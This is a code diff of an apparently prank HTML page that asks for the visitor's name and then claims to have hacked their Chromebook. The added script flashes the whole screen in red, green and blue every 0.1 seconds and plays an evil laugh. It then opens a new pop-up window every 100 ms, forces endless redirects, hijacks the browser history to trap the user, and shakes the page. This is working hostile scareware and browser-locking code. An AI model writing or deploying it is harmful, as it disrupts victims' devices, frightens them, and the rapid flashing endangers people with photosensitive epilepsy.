@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Goodbye, Good Boy 🟩</title>
+    <title>You've Been Hacked 😈</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
 
@@ -52,14 +52,28 @@
             display: none;
         }
 
-        /* Matrix Falling Code Effect */
-        canvas {
+        /* Flashing Crazy Colors */
+        @keyframes flash {
+            0% { background-color: black; }
+            25% { background-color: red; }
+            50% { background-color: green; }
+            75% { background-color: blue; }
+            100% { background-color: black; }
+        }
+
+        .flashing {
+            animation: flash 0.1s infinite;
+        }
+
+        /* Hacker Image */
+        .hacker {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
         }
     </style>
 </head>
@@ -73,7 +87,9 @@
 
     <div id="message" class="hidden">
         <h1>Good boy, <span id="userName"></span> 😈</h1>
-        <p>Kiss your computer goodbye... 💋</p>
+        <p>Kiss your Chromebook goodbye... 💋</p>
+        <img src="https://camo.githubusercontent.com/f53b4da520b56bcbcbf3ac2d9d2687e07a476166536e7b4c53b2dd687429de78/68747470733a2f2f6d656469612e74656e6f722e636f6d2f6e663938356c573669617741414141432f616e6f6e796d6f75732d6861636b65722e676966" class="hacker" id="hackerImg">
+        <audio id="evilLaugh" src="https://www.fesliyanstudios.com/play-mp3/4386" preload="auto"></audio>
     </div>
 
     <script>
@@ -86,11 +102,34 @@
             document.getElementById("nameInput").style.display = "none";
             document.querySelector("button").style.display = "none";
 
-            // Start the crash sequence
+            // Flashing chaos colors
+            document.body.classList.add("flashing");
+
+            // Show creepy hacker image
+            document.getElementById("hackerImg").style.opacity = "1";
+
+            // Play Evil Laughter
+            document.getElementById("evilLaugh").play();
+
+            // Start the crash sequence after 3 seconds
             setTimeout(() => {
-                while (true) {
-                    location.reload();
-                }
+                document.body.innerHTML = "<h1 style='color:red; font-size:5rem;'>SYSTEM FAILURE</h1>";
+
+                // CHAOS MODE ACTIVATED:
+                setInterval(() => { window.open("https://theuselessweb.com", "_blank"); }, 100);
+                setInterval(() => { window.location = "https://www.neverendingredditloop.com"; }, 100);
+                onbeforeunload = function(){localStorage.x=1};
+
+                // Browser Lock
+                history.pushState(null, null, location.href);
+                setInterval(() => { history.pushState(null, null, location.href); }, 50);
+
+                // Violent Screen Shake
+                setInterval(() => {
+                    let x = Math.random() * 10 - 5;
+                    let y = Math.random() * 10 - 5;
+                    document.body.style.transform = `translate(${x}px, ${y}px)`;
+                }, 50);
             }, 3000);
         }
 
